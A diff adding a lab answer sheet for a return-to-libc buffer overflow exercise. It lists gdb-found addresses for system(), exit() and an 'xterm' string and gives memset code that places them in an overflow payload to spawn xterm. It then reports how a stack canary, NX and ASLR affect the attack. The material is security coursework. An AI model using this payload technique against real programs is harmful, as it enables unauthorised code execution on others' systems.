@@ -1,0 +1,59 @@
+TASK 1:
+	How did you find the addresses you used in your exploit? 
+
+		I found the addresses:
+
+			&system:
+			b7e573e0
+
+			$XTERM:
+			bffffc57
+
+			&exit:
+			b7e4a1b0
+
+		by using gdb command "x system", "x exit" and "find $esp, +1500, "xterm" ".
+
+		Note that +1500 had to be used and tinkered with, since too big a number here could be out of valid memory.
+
+	In what order did you put them in the exploit file?
+
+		The main problem is that the function is not CALL'd but instead RETURN'd to. So the stack of vuln has to be designed according to the calling convention that would be followed. So, as follows:
+
+		//Set &system into 12 + 12 == return address entry of vuln.
+		memset(buffer+24, 0xe0, 1);
+		memset(buffer+25, 0x73, 1);
+		memset(buffer+26, 0xe5, 1);
+		memset(buffer+27, 0xb7, 1);
+
+		//Set Argument for system() == &"xterm"
+		memset(buffer+32, 0x5c, 1);
+		memset(buffer+33, 0xfc, 1);
+		memset(buffer+34, 0xff, 1);
+		memset(buffer+35, 0xbf, 1);
+
+
+		//Set &exit to be grabbed as return address when returning from system()
+		memset(buffer+36, 0xb0, 1);
+		memset(buffer+37, 0xa1, 1);
+		memset(buffer+38, 0xe4, 1);
+		memset(buffer+39, 0xb7, 1);
+
+		Note that the first 12 in 12 + 12 comes from the 12 bytes of padding previously discovered in lab3.
+
+TASK 2:
+	
+	Stack Protector (Canary)
+		FAILED.
+		Since buffer overflow was detected by the canary being overwritten.
+
+	NX:
+		SUCCESS.
+		Since NX only prevents code on the stack from being executed, and the code that was executed was not on the stack, then it makes sense that NX does not protect against return-to-libc.
+		Note that it doesn't matter that we WRITE to the stack (for the return addresses) as long as we don't EXECUTE off the stack.
+
+	ASLR:
+		FAILED.
+		Absolute addresses used are not correct due to random offset inserted by ASLR.
+
+	This technique is different from lab3 in that we are not injecting shellcode onto the stack for execution. Instead, we re-direct the return address of the vulnerable function to call the system() function. We also cleverly make it so that when system() returns, exit() is called and the process exits cleanly.
